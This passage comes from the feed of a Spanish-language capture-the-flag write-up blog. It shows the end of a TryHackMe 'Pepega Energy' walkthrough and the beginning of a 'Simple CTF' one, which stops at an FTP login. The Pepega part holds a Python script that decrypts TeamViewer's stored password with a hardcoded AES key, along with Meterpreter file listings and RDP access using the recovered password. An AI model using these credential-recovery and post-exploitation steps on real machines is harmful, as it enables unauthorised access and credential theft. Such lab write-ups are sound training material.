        &lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cipher&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AES&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AES&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MODE_CBC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cipher&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;binascii&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;unhexlify&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;0602000000a400005253413100040000&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;iv&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;binascii&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;unhexlify&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;0100010067244F436E6762F25EA8D704&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;hex_str_cipher&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;871C158E545657D6D714B34730465D85E4A[... snip ...]FC41AA4A18ADFE594917DD1847A810EFF8C13356&amp;#34;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#Query&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;ciphertext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;binascii&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;unhexlify&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hex_str_cipher&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;raw_un&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AESCipher&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;iv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ciphertext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hexdump&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hexdump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;raw_un&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;raw_un&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;utf-16&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Contraseña:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/pepegaenergy# python aes_teamviewer.py 
00000000: &lt;span class=&#34;m&#34;&gt;52&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;65&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;42&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;75&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; 6C &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; 6C &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;45&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;  R.e.d.....l.l.E.
00000010: 6E &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;65&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;72&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;67&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;79&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;42&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;61&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
00000020: &lt;span class=&#34;m&#34;&gt;58&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;44&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;  X...............
None
Re&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;D
root@aoiri:~/tryhackme/pepegaenergy#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;flags&#34;&gt;FLAGS&lt;/h2&gt;
&lt;p&gt;En la carpeta de Timmy y Zachary vemos algunos archivos con extencion rtf, los cuales podemos abrir utilizando Writer de LibreOffice y obtener la informacion que necesitamos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;meterpreter &amp;gt; ls
Listing: C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;immy&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop
&lt;span class=&#34;o&#34;&gt;===============================&lt;/span&gt;

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  &lt;span class=&#34;m&#34;&gt;1155&lt;/span&gt;   fil   2020-02-04 17:15:48 -0600  RuneLite.lnk
100666/rw-rw-rw-  &lt;span class=&#34;m&#34;&gt;282&lt;/span&gt;    fil   2020-02-04 13:56:30 -0600  desktop.ini
100666/rw-rw-rw-  &lt;span class=&#34;m&#34;&gt;42337&lt;/span&gt;  fil   2020-02-04 17:14:03 -0600  home work.rtf
100666/rw-rw-rw-  &lt;span class=&#34;m&#34;&gt;43806&lt;/span&gt;  fil   2020-02-04 17:14:03 -0600  important.rtf
100666/rw-rw-rw-  &lt;span class=&#34;m&#34;&gt;41978&lt;/span&gt;  fil   2020-02-04 17:14:03 -0600  rune scape pass word.rtf
100777/rwxrwxrwx  &lt;span class=&#34;m&#34;&gt;41&lt;/span&gt;     fil   2020-02-04 13:59:32 -0600  script.bat

meterpreter &amp;gt; dir
Listing: C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\Z&lt;/span&gt;achary&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;ork &lt;span class=&#34;nv&#34;&gt;Documents&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;================================================&lt;/span&gt;

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100666/rw-rw-rw-  &lt;span class=&#34;m&#34;&gt;42457&lt;/span&gt;     fil   2020-02-04 17:12:36 -0600  Email Backup - Mockup.rtf
100666/rw-rw-rw-  &lt;span class=&#34;m&#34;&gt;12234768&lt;/span&gt;  fil   2020-02-04 17:12:36 -0600  Mockup 1.png
100666/rw-rw-rw-  &lt;span class=&#34;m&#34;&gt;11780324&lt;/span&gt;  fil   2020-02-04 17:12:36 -0600  Mockup 2.png
100666/rw-rw-rw-  &lt;span class=&#34;m&#34;&gt;680&lt;/span&gt;       fil   2020-02-04 15:44:41 -0600  To-Do List.rtf
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;rdp---desktop&#34;&gt;RDP - Desktop&lt;/h3&gt;
&lt;p&gt;Utilizamos el servicio RDP de la maquina para obtener las flags dentro de Firefox del usuario Zachary y Timmy, para iniciar sesion en este servicio utilizamos al usuario Zachary y la contraseña que encontramos en TeamViewer:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Zachary&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/pepegaenergy/Screenshot_20200211_215826.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Timmy&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/pepegaenergy/Screenshot_20200211_221451.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/pepegaenergy/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/pepegaenergy/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>windows</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Simple CTF</title>
        <link>https://sckull.github.io/posts/simplectfthm/</link>
        <pubDate>Wed, 05 Feb 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 05 Feb 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/simplectfthm/</guid>
        <description>Simple CTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Simple CTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/simplectf/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Simple CTF&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Beginner level ctf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;2680&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/MrSeth6797&#34;&gt;MrSeth6797&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp/udp, nmap nos muestra el puerto http (80), el puerto ssh (2222) y el puerto ftp (21) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Feb  5 00:40:46 2020 as: nmap -p- -sV -sC -T4 -o nmap_scan 10.10.235.105&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.235.105
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.17s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65532&lt;/span&gt; filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ftp-anon: Anonymous FTP login allowed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Can&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t get directory listing: TIMEOUT
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ftp-syst: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   STAT: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; FTP server status:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Connected to ::ffff:10.8.1.72
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Logged in as ftp
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      TYPE: ASCII
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      No session bandwidth limit
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Session timeout in seconds is &lt;span class=&#34;m&#34;&gt;300&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Control connection is plain text
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Data connections will be plain text
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      At session startup, client count was &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      vsFTPd 3.0.3 - secure, fast, stable
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_End of status
80/tcp   open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-robots.txt: &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; disallowed entries 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_/ /openemr-5_0_1_3 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a💿a9:23 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 9b:d1:65:07:51:08:00:61:98🇩🇪95:ed:3a:e3:81:1c &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Feb  5 00:46:01 2020 -- 1 IP address (1 host up) scanned in 314.63 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
&lt;p&gt;Accedemos al servicio ftp mediante el &amp;lsquo;usuario&amp;rsquo; anonymous y encontramos una nota en la que nos muestra un mensaje que indica que la contraseña es la misma que el usuario y la contraseña puede ser crackeada en segundos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/simplectf# ftp 10.10.235.105
Connected to 10.10.235.105.
&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
